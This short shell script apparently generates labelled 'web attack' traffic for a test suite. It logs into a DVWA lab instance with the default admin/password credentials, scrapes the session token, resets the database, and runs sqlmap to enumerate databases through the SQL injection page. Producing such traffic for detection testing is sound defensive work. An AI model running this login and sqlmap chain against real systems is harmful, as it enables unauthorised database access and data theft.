#!/bin/sh
# Expected class: Web attack. sqlmap against DVWA (default login admin/password).
. "$(dirname "$0")/common.sh"
CJ=$(mktemp)
TOKEN=$(curl -s -c "$CJ" "http://$DVWA_IP/login.php" | sed -n "s/.*user_token' value='\([^']*\)'.*/\1/p")
curl -s -b "$CJ" -c "$CJ" -o /dev/null -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "http://$DVWA_IP/login.php"
SESSID=$(awk '$6=="PHPSESSID"{print $7}' "$CJ")
curl -s -b "$CJ" -o /dev/null -d "create_db=Create / Reset Database" "http://$DVWA_IP/setup.php"
sqlmap -u "http://$DVWA_IP/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$SESSID; security=low" --batch --level=2 --dbs
rm -f "$CJ"
